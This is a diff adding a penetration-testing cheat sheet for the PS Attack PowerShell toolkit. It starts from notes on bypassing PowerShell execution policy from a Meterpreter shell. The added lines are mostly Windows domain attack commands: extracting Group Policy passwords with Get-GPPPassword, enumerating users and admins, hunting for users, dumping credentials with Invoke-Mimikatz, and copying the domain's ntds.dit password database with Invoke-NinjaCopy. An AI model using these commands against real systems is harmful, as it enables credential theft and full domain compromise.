@@ -39,3 +39,47 @@ The file Cannot be loaded because the execution of scripts is disabled on this s
 powershell.exe -executionpolicy bypass -file <file>
 
 Use the same command to run a file remotely on a Windows system from an active Meterpreter shell.
+------------------------------------------------------------------------------------------------------
+
+# PS Attack
+
+Get-GPPPassword
+
+get-attack “active directory”
+get-help Get-NetUser
+Get-NetUser -UserName <user>
+
+get-attack groups
+get-help Get-NetLocalGroup
+Get-NetLocalGroup -GroupName “Administrators”
+---------------------------------------------------------
+
+Restart PS Attack and run as a local user Administrator.
+
+get-attack “local admin”
+Find-LocalAdminAccess
+
+get-attack find
+get-help Invoke-UserHunter
+Invoke-UserHunter -Examples
+Invoke-UserHunter -CheckAccess
+
+Get-Attack mimi
+get-help Invoke-Mimikatz
+Invoke-Mimikatz -ComputerName <target> -DumpCreds
+---------------------------------------------------------
+
+Restart PS Attack and run as a Domain Admin.
+
+get-attack “domain controller”
+Get-NetDomainController
+
+get-attack copy
+get-help Invoke-NinjaCopy -Examples
+Invoke-NinjaCopy -Path “C:\windows\ntds\ntds.dit” -ComputerName <target> -LocalDestination “C:\ntds.dit”
+(takes a little while)
+ls
+---------------------------------------------------------
+
+PS Attack build tool
+
